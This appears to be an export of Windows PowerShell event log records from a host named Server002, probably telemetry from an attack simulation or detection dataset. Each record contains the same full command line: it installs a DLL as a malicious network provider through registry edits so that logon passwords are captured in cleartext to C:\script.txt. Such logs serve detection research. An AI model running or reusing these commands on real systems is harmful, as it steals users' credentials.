{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-20 17:08:28.3963203"},"EventRecordID":"1067","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=deeb3351-b443-448e-8ac9-d353f5c3b2ff\r\n\tHostApplication=powershell.exe &amp; {Copy-Item \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.dll\" -Destination \"C:\\Windows\\System32\"\r\n$path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER\r\n$UpdatedValue = $Path.PROVIDERORDER + \",script\"\r\nSet-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue\r\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script -ErrorAction Ignore\r\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -ErrorAction Ignore\r\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -Name \"Class\" -Value 2 -ErrorAction Ignore\r\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -Name \"Name\" -Value script -ErrorAction Ignore\r\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%SystemRoot%\\System32\\script.dll\" -ErrorAction Ignore\r\necho \"[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\script.txt\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-20 17:08:28.4162773"},"EventRecordID":"1068","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=deeb3351-b443-448e-8ac9-d353f5c3b2ff\r\n\tHostApplication=powershell.exe &amp; {Copy-Item \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.dll\" -Destination \"C:\\Windows\\System32\"\r\n$path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER\r\n$UpdatedValue = $Path.PROVIDERORDER + \",script\"\r\nSet-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue\r\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script -ErrorAction Ignore\r\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -ErrorAction Ignore\r\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -Name \"Class\" -Value 2 -ErrorAction Ignore\r\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -Name \"Name\" -Value script -ErrorAction Ignore\r\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%SystemRoot%\\System32\\script.dll\" -ErrorAction Ignore\r\necho \"[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\script.txt\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-20 17:08:28.4162773"},"EventRecordID":"1069","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=deeb3351-b443-448e-8ac9-d353f5c3b2ff\r\n\tHostApplication=powershell.exe &amp; {Copy-Item \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.dll\" -Destination \"C:\\Windows\\System32\"\r\n$path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER\r\n$UpdatedValue = $Path.PROVIDERORDER + \",script\"\r\nSet-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue\r\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script -ErrorAction Ignore\r\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -ErrorAction Ignore\r\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -Name \"Class\" -Value 2 -ErrorAction Ignore\r\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -Name \"Name\" -Value script -ErrorAction Ignore\r\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%SystemRoot%\\System32\\script.dll\" -ErrorAction Ignore\r\necho \"[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\script.txt\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-20 17:08:28.4315540"},"EventRecordID":"1070","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=deeb3351-b443-448e-8ac9-d353f5c3b2ff\r\n\tHostApplication=powershell.exe &amp; {Copy-Item \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.dll\" -Destination \"C:\\Windows\\System32\"\r\n$path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER\r\n$UpdatedValue = $Path.PROVIDERORDER + \",script\"\r\nSet-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue\r\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script -ErrorAction Ignore\r\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -ErrorAction Ignore\r\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -Name \"Class\" -Value 2 -ErrorAction Ignore\r\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -Name \"Name\" -Value script -ErrorAction Ignore\r\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%SystemRoot%\\System32\\script.dll\" -ErrorAction Ignore\r\necho \"[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\script.txt\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-20 17:08:28.4500565"},"EventRecordID":"1071","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=deeb3351-b443-448e-8ac9-d353f5c3b2ff\r\n\tHostApplication=powershell.exe &amp; {Copy-Item \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.dll\" -Destination \"C:\\Windows\\System32\"\r\n$path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER\r\n$UpdatedValue = $Path.PROVIDERORDER + \",script\"\r\nSet-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue\r\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script -ErrorAction Ignore\r\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -ErrorAction Ignore\r\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -Name \"Class\" -Value 2 -ErrorAction Ignore\r\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -Name \"Name\" -Value script -ErrorAction Ignore\r\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%SystemRoot%\\System32\\script.dll\" -ErrorAction Ignore\r\necho \"[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\script.txt\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-20 17:08:28.4500565"},"EventRecordID":"1072","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=deeb3351-b443-448e-8ac9-d353f5c3b2ff\r\n\tHostApplication=powershell.exe &amp; {Copy-Item \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.dll\" -Destination \"C:\\Windows\\System32\"\r\n$path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER\r\n$UpdatedValue = $Path.PROVIDERORDER + \",script\"\r\nSet-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue\r\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script -ErrorAction Ignore\r\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -ErrorAction Ignore\r\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -Name \"Class\" -Value 2 -ErrorAction Ignore\r\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -Name \"Name\" -Value script -ErrorAction Ignore\r\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%SystemRoot%\\System32\\script.dll\" -ErrorAction Ignore\r\necho \"[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\script.txt\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-20 17:08:28.7098056"},"EventRecordID":"1073","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=deeb3351-b443-448e-8ac9-d353f5c3b2ff\r\n\tHostApplication=powershell.exe &amp; {Copy-Item \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.dll\" -Destination \"C:\\Windows\\System32\"\r\n$path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER\r\n$UpdatedValue = $Path.PROVIDERORDER + \",script\"\r\nSet-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue\r\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script -ErrorAction Ignore\r\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -ErrorAction Ignore\r\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -Name \"Class\" -Value 2 -ErrorAction Ignore\r\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -Name \"Name\" -Value script -ErrorAction Ignore\r\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%SystemRoot%\\System32\\script.dll\" -ErrorAction Ignore\r\necho \"[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\script.txt\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=e3139570-8f21-468b-8409-2b897a1d7e14\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-20 17:08:29.9354288"},"EventRecordID":"1074","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=15\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=deeb3351-b443-448e-8ac9-d353f5c3b2ff\r\n\tHostApplication=powershell.exe &amp; {Copy-Item \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.dll\" -Destination \"C:\\Windows\\System32\"\r\n$path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER\r\n$UpdatedValue = $Path.PROVIDERORDER + \",script\"\r\nSet-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue\r\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script -ErrorAction Ignore\r\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -ErrorAction Ignore\r\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -Name \"Class\" -Value 2 -ErrorAction Ignore\r\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -Name \"Name\" -Value script -ErrorAction Ignore\r\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\script\\NetworkProvider -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%SystemRoot%\\System32\\script.dll\" -ErrorAction Ignore\r\necho \"[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\script.txt\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=e3139570-8f21-468b-8409-2b897a1d7e14\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
